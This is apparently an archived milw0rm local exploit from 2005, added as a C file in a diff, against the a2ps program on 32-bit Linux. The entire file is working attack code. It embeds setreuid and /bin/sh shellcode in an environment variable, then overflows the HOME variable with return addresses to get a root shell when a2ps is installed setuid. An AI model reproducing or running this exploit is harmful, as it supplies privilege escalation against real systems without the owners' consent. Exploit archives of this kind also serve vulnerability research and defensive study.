@@ -1,0 +1,59 @@
+/* Not added to Local Non Poc section /str0ke */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+// by lizard / lizstyle[at]gmail.com
+// greets go to slider/trog for helpin me
+// not suid by default ;(
+#define VULNTHING "/usr/bin/a2ps"
+#define DEFRET 0xbffffffa - strlen(sc) - strlen(VULNTHING)
+#define xnullbitch 1100
+//i`m not a asm guru so i ripped this shellcode
+//shellcode by  man shadow
+char sc[] =
+"\x31\xC9"              /* xor ecx,ecx     */
+"\x31\xDB"              /* xor ebx,ebx     */
+"\x6A\x46"              /* push byte 70    */
+"\x58"                  /* pop eax         */
+"\xCD\x80"              /* int 80h         */
+"\x51"                  /* push ecx        */
+"\x68\x2F\x2F\x73\x68"  /* push 0x68732F2F */
+"\x68\x2F\x62\x69\x6E"  /* push 0x6E69622F */
+"\x89\xE3"              /* mov ebx,esp     */
+"\x51"                  /* push ecx        */
+"\x53"                  /* push ebx        */
+"\x89\xE1"              /* mov ecx,esp     */
+"\x99"                  /* cdq             */
+"\xB0\x0B"              /* mov al,11       */
+"\xCD\x80";             /* int 80h         */
+
+int main(void) {
+
+int ctr = 0;
+char buffer[xnullbitch];
+fprintf(stdout, "[*] 0x%8x\n", (long) DEFRET);
+
+for(ctr = 0; ctr < xnullbitch - 1; ctr += 4)
+*(long *) &buffer[ctr] = (long) DEFRET;
+
+buffer[xnullbitch - 1] = '\0';
+
+if((setenv("HOME", buffer, 1)) == -1) {
+perror("setenv()");
+exit(1);
+}
+
+if((setenv("TOPX", sc, 1)) == -1) {
+perror("setenv()");
+exit(1);
+}
+
+if((execl(VULNTHING, VULNTHING, NULL)) == -1) {
+perror("execl()");
+exit(1);
+}
+return(0);
+}
+
+// milw0rm.com [2005-02-13]
